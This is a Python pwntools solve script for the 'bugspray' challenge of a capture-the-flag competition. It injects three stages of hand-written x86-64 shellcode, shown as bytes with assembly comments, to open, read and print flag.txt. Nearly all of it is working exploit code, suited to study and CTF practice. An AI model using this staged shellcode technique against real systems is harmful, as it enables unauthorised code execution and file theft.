from pwn import *

# context.log_level = 'debug'

if args.REMOTE:
    io = remote('chal.2023.sunshinectf.games', 23004)
else:
    io = process('./bugspray')

'''
read syscall to allow for further instructions to be placed after syscall
0:  48 31 ff                xor    rdi,rdi
3:  48 c7 c6 8d 77 77 00    mov    rsi,0x77778d
a:  48 c7 c2 16 01 00 00    mov    rdx,0x116
11: 48 31 c0                xor    rax,rax
14: 0f 05                   syscall 
'''
read_shellcode = b"\x48\x31\xFF\x48\xC7\xC6\x8D\x77\x77\x00\x48\xC7\xC2\x16\x01\x00\x00\x48\x31\xC0\x0F\x05"
read_shellcode += b'\x90' * (0x65 - 0x20 - len(read_shellcode))

io.sendafter(b'>>> \x00\x00', read_shellcode)

# pause to allow for ntr (in remote, the sends coalesce)
log.info('We have sent the initial read shellcode sheeeeesh')
pause()

'''
xor rdi, rdi
xor rax, rax
mov rsi, 0x777777
mov rdx, 0x123     ; 300 - 9 ; to avoid overwriting mov rax, 0x777777; jmp rax
syscall
mov rax, 0x777777
jmp rax
'''
# reads shellcode, places it at 0x777777, then jumps back to 0x777777
rewrite_shellcode = b"\x48\x31\xFF\x48\x31\xC0\x48\xC7\xC6\x77\x77\x77\x00\x48\xC7\xC2\x23\x01\x00\x00\x0F\x05\x48\xC7\xC0\x77\x77\x77\x00\xFF\xE0"
rewrite_shellcode = b'\x90' * (300 - len(read_shellcode)) + rewrite_shellcode

log.info('We now allow a much bigger shellcode. we get flag next')
io.send(rewrite_shellcode)

# pause to allow for ntr
pause()

'''
push 0
mov rax, 0x7478742e67616c66     ; flag.txt
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 2                      ; sys_open
syscall

mov rdi, rax                    ; move to rdi the fd result from open
mov rsi, rsp
mov rdx, 0x100
xor rax, rax                    ; sys_read (0)
syscall

mov rdx, rax                    ; move to rdx how many bytes read
mov rsi, rsp
mov rdi, 1
mov rax, 1                      ; sys_write
syscall
'''
# open, read, write flag.txt
payload = b"\x6A\x00\x48\xB8\x66\x6C\x61\x67\x2E\x74\x78\x74\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\x89\xE6\x48\xC7\xC2\x00\x01\x00\x00\x48\x31\xC0\x0F\x05\x48\x89\xC2\x48\x89\xE6\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05"

io.send(payload)

print('Flag:', io.recvline().decode('ascii'))
